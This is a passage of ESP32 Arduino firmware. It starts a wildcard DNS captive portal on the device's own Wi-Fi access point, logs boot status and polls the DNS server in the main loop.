  // Port 53 UDP. "*" wildcard catches all hostnames.
  dns.start(53, "*", WiFi.softAPIP());
  INFO("DNS captive portal up: *.* → %s", WiFi.softAPIP().toString().c_str());

  setLed(LS_GREEN);
  INFO("AP: %s  IP: %s  UI: http://%s/",
       AP_SSID, WiFi.softAPIP().toString().c_str(),
       WiFi.softAPIP().toString().c_str());
  logEvent("Boot OK — AP:%s  Heap:%u  PSRAM:%s",
    AP_SSID, ESP.getFreeHeap(), psramFound() ? "YES" : "NO");
}

// ─── LOOP ────────────────────────────────────────────────────────────────────
void loop() {
  dns.processNextRequest();   // sync DNSServer — must be polled each loop
  updateLED();
  delay(5);
}
// DNSServer (sync, built-in to core) requires processNextRequest() each loop
// iteration to service incoming DNS queries. Overhead is ~microseconds.
